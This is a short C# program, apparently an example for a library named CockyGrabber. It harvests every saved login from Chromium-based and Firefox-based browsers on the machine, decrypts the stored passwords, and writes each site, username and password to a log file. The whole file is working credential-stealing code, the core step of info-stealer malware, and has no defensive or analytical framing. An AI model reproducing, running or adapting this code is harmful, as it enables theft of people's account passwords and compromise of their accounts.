using CockyGrabber;
using CockyGrabber.Grabbers;
using System;
using System.IO;
using System.Text;

namespace CockyGrabberTest
{
    // This Program grabs all logins that could be found and saves them in a log file
    class Program
    {
        private const string LogFilePath = "LOG FILE PATH HERE.txt";

        static void Main(string[] args)
        {
            UniversalGrabber g = new UniversalGrabber(); // Create Grabber

            StringBuilder logins = new StringBuilder();
            logins.AppendLine();
            logins.AppendLine("==========================================================================================");
            logins.AppendLine($"NEW LOG STARTED AT {DateTimeOffset.Now}:");
            logins.AppendLine();

            // Grab logins and store the URLs, usernames and passwords in 'logins':
            foreach (Blink.Login c in g.GetAllBlinkLogins())
            {
                logins.AppendLine($"Website: {c.OriginUrl} | Username: {c.UsernameValue} | Password: {c.DecryptedPasswordValue}");
            }
            foreach (Gecko.Login c in g.GetAllGeckoLogins())
            {
                logins.AppendLine($"Website: {c.Hostname} | Username: {c.DecryptedUsername} | Password: {c.DecryptedPassword}");
            }

            File.AppendAllText(LogFilePath, logins.ToString()); // Append the grabbed logins to the log file
        }
    }
}
